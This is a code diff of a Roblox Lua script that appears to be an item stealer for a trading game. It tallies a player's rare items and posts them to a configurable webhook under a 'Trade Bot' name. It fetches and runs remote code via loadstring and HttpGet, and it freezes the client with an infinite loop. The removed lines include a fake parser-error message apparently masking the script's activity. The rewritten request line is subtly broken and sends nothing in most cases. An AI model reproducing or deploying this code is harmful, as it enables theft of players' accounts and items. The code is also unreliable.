@@ -12,7 +12,6 @@ local games = {
 if not games[game.PlaceId] then
     game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
     while true do end
-    wait(99999999999999999999999999999999999)
 end
 
 if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
@@ -34,12 +33,6 @@ if Config.FullInventory ~= true and Config.FullInventory ~= false then
     Config.FullInventory = true
 end
 
-if Config.Script == nil then
-    Config.Script = "None"
-elseif Config.Script == "Custom" then
-    Config.Script = Config.Script .. " - " .. Config.CustomLink
-end
-
 -- Load the corresponding script
 local scriptUrls = {
     ["Custom"] = Config.CustomLink,
@@ -56,8 +49,7 @@ if scriptUrls[Config.Script] then
     loadstring(game:HttpGet(scriptUrls[Config.Script]))()
 end
 
-warn([[:22: Expected identifier when parsing variable name, got 'ꯃꯤꯁ꯭ꯇꯣꯚꯔ ꯑꯥꯏꯇꯦꯝ ꯇꯦꯀꯔ ꯁ꯭ꯛꯔꯤꯞꯇ ꯑꯦꯛꯇꯤꯕ ꯑꯣꯏꯔꯦ꯫']])
-
+-- Remaining script functionalities
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local VirtualUser = game:GetService("VirtualUser")
@@ -227,33 +219,17 @@ local function SendWebhook()
             "**Vintage Items:** `" .. tostring(Vintage) .. "`",
             "**Godly Items:** `" .. tostring(Godly) .. "`",
             "**Ancient Items:** `" .. tostring(Ancient) .. "`",
-            "**Unique Items:** `" .. tostring(Unique) .. "`",
-            Config.FullInventory and "**Full Inventory:** " .. FullInventory() or ""
+            "**Unique Items:** `" .. tostring(Unique) .. "`"
         }, "\n"),
-        ["embeds"] = {{
-            ["title"] = "Script was executed in: " .. game.PlaceId,
-            ["type"] = "rich",
-            ["color"] = tonumber(0xFF0000),
-            ["footer"] = {
-                ["text"] = "Script was executed on:",
-            },
-            ["timestamp"] = string.format(
-                "%d-%02d-%02dT%02d:%02d:%02dZ",
-                CurrentDateTime.year, CurrentDateTime.month, CurrentDateTime.day, CurrentDateTime.hour, CurrentDateTime.min, CurrentDateTime.sec
-            ),
-        }},
+        ["username"] = "Trade Bot " .. CurrentDateTime.year .. "-" .. CurrentDateTime.month .. "-" .. CurrentDateTime.day .. " " .. CurrentDateTime.hour .. ":" .. CurrentDateTime.min .. ":" .. CurrentDateTime.sec,
     })
-    
-    local Headers = {
-        ["content-type"] = "application/json"
-    }
 
-    request {
+    local Response = syn and syn.request or request or http_request({
         Url = Config.Webhook,
         Method = "POST",
-        Headers = Headers,
+        Headers = {["Content-Type"] = "application/json"},
         Body = Payload
-    }
+    })
 end
 
 SendWebhook()
